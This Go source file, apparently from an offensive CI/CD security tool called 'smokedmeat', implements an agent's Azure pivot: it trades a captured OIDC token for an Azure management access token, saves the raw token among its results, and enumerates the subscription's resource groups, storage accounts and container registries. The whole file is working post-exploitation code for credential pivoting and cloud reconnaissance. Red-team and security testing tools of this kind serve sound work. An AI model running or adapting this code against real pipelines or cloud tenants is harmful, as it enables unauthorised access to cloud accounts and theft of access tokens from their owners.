// Copyright (C) 2026 boostsecurity.io
// SPDX-License-Identifier: AGPL-3.0-or-later

package brisket

import (
	"context"
	"fmt"
	"sync"

	"github.com/aws/aws-sdk-go-v2/aws"

	"github.com/Azure/azure-sdk-for-go/sdk/azcore"
	"github.com/Azure/azure-sdk-for-go/sdk/azcore/arm"
	"github.com/Azure/azure-sdk-for-go/sdk/azcore/policy"
	"github.com/Azure/azure-sdk-for-go/sdk/azidentity"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/containerregistry/armcontainerregistry"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/resources/armresources"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/resources/armsubscriptions"
	"github.com/Azure/azure-sdk-for-go/sdk/resourcemanager/storage/armstorage"

	"github.com/boostsecurityio/smokedmeat/internal/models"
)

func (a *Agent) pivotAzure(token *OIDCToken, result *models.PivotResult, args []string) error {
	tenantID := getArgOrEnv(args, "tenant-id", "AZURE_TENANT_ID")
	clientID := getArgOrEnv(args, "client-id", "AZURE_CLIENT_ID")

	if tenantID == "" || clientID == "" {
		return fmt.Errorf("AZURE_TENANT_ID and AZURE_CLIENT_ID required for OIDC login")
	}

	ctx := context.Background()

	cred, err := azidentity.NewClientAssertionCredential(
		tenantID, clientID,
		func(_ context.Context) (string, error) { return token.RawToken, nil },
		nil,
	)
	if err != nil {
		return fmt.Errorf("azure credential creation failed: %w", err)
	}

	azToken, err := cred.GetToken(ctx, policy.TokenRequestOptions{
		Scopes: []string{"https://management.azure.com/.default"},
	})
	if err != nil {
		return fmt.Errorf("azure token acquisition failed: %w", err)
	}

	result.Credentials = map[string]string{
		"TenantID": tenantID,
		"ClientID": clientID,
		"Method":   "federated_identity",
	}

	result.RawCredentials = map[string]string{
		"TENANT_ID":    tenantID,
		"CLIENT_ID":    clientID,
		"ACCESS_TOKEN": azToken.Token,
		"EXPIRES_ON":   azToken.ExpiresOn.Format("2006-01-02 15:04:05.000000"),
	}

	subscriptionID := getArgOrEnv(args, "subscription-id", "AZURE_SUBSCRIPTION_ID")
	if subscriptionID == "" {
		subscriptionID = a.discoverAzureSubscription(ctx, cred)
	}
	if subscriptionID != "" {
		result.Credentials["SubscriptionID"] = subscriptionID
		result.RawCredentials["SUBSCRIPTION_ID"] = subscriptionID
	}

	a.enumerateAzure(ctx, result, cred, subscriptionID)

	return nil
}

func (a *Agent) discoverAzureSubscription(ctx context.Context, cred azcore.TokenCredential) string {
	subClient, err := armsubscriptions.NewClient(cred, nil)
	if err != nil {
		return ""
	}
	pager := subClient.NewListPager(nil)
	page, err := pager.NextPage(ctx)
	if err != nil {
		return ""
	}
	for _, sub := range page.Value {
		if sub.State != nil && *sub.State == armsubscriptions.SubscriptionStateEnabled {
			return aws.ToString(sub.SubscriptionID)
		}
	}
	if len(page.Value) > 0 && page.Value[0].SubscriptionID != nil {
		return *page.Value[0].SubscriptionID
	}
	return ""
}

func (a *Agent) enumerateAzure(ctx context.Context, result *models.PivotResult, cred azcore.TokenCredential, subscriptionID string) {
	if subscriptionID == "" {
		return
	}

	opts := &arm.ClientOptions{}
	var wg sync.WaitGroup
	var mu sync.Mutex

	wg.Add(3)
	go func() {
		defer wg.Done()
		rgClient, err := armresources.NewResourceGroupsClient(subscriptionID, cred, opts)
		if err != nil {
			return
		}
		pager := rgClient.NewListPager(nil)
		page, pgErr := pager.NextPage(ctx)
		if pgErr != nil {
			return
		}
		mu.Lock()
		for _, g := range page.Value {
			result.Resources = append(result.Resources, models.CloudResource{
				Type:   "resource_group",
				ID:     aws.ToString(g.ID),
				Name:   aws.ToString(g.Name),
				Region: aws.ToString(g.Location),
			})
		}
		mu.Unlock()
	}()

	go func() {
		defer wg.Done()
		stClient, err := armstorage.NewAccountsClient(subscriptionID, cred, opts)
		if err != nil {
			return
		}
		pager := stClient.NewListPager(nil)
		page, pgErr := pager.NextPage(ctx)
		if pgErr != nil {
			return
		}
		mu.Lock()
		for _, acct := range page.Value {
			result.Resources = append(result.Resources, models.CloudResource{
				Type:   "storage_account",
				ID:     aws.ToString(acct.ID),
				Name:   aws.ToString(acct.Name),
				Region: aws.ToString(acct.Location),
			})
		}
		mu.Unlock()
	}()

	go func() {
		defer wg.Done()
		acrClient, err := armcontainerregistry.NewRegistriesClient(subscriptionID, cred, opts)
		if err != nil {
			return
		}
		pager := acrClient.NewListPager(nil)
		page, pgErr := pager.NextPage(ctx)
		if pgErr != nil {
			return
		}
		mu.Lock()
		for _, reg := range page.Value {
			loginServer := ""
			if reg.Properties != nil && reg.Properties.LoginServer != nil {
				loginServer = *reg.Properties.LoginServer
			}
			result.Resources = append(result.Resources, models.CloudResource{
				Type: "container_registry",
				ID:   aws.ToString(reg.ID),
				Name: aws.ToString(reg.Name),
				Metadata: map[string]string{
					"loginServer": loginServer,
				},
			})
		}
		mu.Unlock()
	}()

	wg.Wait()
}
